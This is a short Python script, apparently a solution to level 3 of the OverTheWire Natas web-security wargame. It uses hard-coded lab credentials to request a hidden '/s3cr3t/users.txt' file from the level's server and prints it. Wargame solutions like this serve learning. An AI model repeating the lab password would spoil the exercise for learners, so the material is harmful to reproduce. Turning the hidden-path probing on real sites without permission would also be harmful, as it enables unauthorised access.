import requests

r = requests.get(
    'http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt',
    auth=('natas3', '3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH')
)
print(r.text)
